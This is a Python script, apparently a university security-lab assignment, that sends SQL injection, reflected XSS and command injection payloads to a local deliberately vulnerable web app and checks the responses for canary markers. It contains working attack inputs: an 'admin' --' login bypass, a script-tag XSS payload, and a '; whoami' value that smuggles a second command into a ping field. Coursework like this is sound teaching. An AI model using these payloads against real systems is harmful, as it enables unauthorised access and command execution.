#Names: Luis Eduardo Zaldumbide, Miguel Jarrin, Josue Lopez
#Class: Computer Security
#Date: 5/11/2026

# Part A - Attacking Vulnerabilities

import json
import urllib.request
import urllib.parse
import seclab.attack as a
import os

# URL given by python -m seclab.targets --up vuln-web` -> change if run differently.
BASE_URL = os.environ.get("VULN_WEB_URL", "http://127.0.0.1:53935")


# 1) SQL Injection — POST /login {user, pw}
# canary result
SQLI_CANARY = "FLAG-sqli-9f2c-admin-session"

#function to send the sql injection 
def send_sqli(payload_text: str) -> str:
    #body of the html request (post)
    body = json.dumps({"user": payload_text, "pw": "x"}).encode()

    #build the html request
    req = urllib.request.Request(
        f"{BASE_URL}/login", data=body,
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req) as resp:
        return resp.read().decode()

# build the payload
sqli_payloads = [
    a.Payload(text="admin' --", intent="auth-bypass", family="sqli",
              note="insert a quote into the directly inserted sql query to break it and comment the rest of the query with --"),
]

#use oracle confirmation to check the canary leak
sqli_oracle = a.contains_oracle(SQLI_CANARY)


# 2) Reflected XSS — GET /?name=<x>
# xss marker
XSS_MARKER = "<script>alert(1)</script>"

def send_xss(payload_text: str) -> str:
    # build url to see if html reflects the crude html 
    url = f"{BASE_URL}/?name={urllib.parse.quote(payload_text, safe='')}"
    with urllib.request.urlopen(url) as resp:
        return resp.read().decode()

#build payload 
xss_payloads = [
    a.Payload(text=XSS_MARKER, intent="reflected-xss", family="xss",
              note="the <script> must appear WITHOUT escaping in the response message for the HTML"),
]

#use oracle confirmation to check the exact tag in the returning HTML
xss_oracle = a.contains_oracle(XSS_MARKER)


# 3) Command Injection — POST /ping {host}


def send_cmdi(payload_text: str) -> str:
    #body of the HTML request
    body = json.dumps({"host": payload_text}).encode()

    #build the request 
    req = urllib.request.Request(
        f"{BASE_URL}/ping", data=body,
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req) as resp:
        return resp.read().decode()

#building the payload
cmdi_payloads = [
    a.Payload(text="127.0.0.1; whoami", intent="command-injection", family="cmdi",
              note="el ; cuela un segundo comando (whoami) en el ping"),
]

# oracle to confirm the detection if the server detected a shell character
cmdi_oracle = a.contains_oracle('"injection_detected": true')


# Execution and Summary

#run
def run_and_report(name, payloads, send, oracle):
    print(f"\n=== {name} ===")
    findings = a.run_payloads(payloads, send=send, oracle=oracle, trials=1, progress=False)
    a.print_summary(findings)
    for f in findings:
        # show the payload, confirmation and evidence
        print(f"  payload={f.payload.text!r}")
        print(f"  confirmed={f.confirmed}")
        print(f"  evidence={f.evidence[:120]!r}")
        print(f"  error={f.error!r}")
    return findings

# run for all three vulnerabilities
if __name__ == "__main__":
    run_and_report("SQL Injection (/login)", sqli_payloads, send_sqli, sqli_oracle)
    run_and_report("Reflected XSS (/?name=)", xss_payloads, send_xss, xss_oracle)
    run_and_report("Command Injection (/ping)", cmdi_payloads, send_cmdi, cmdi_oracle)
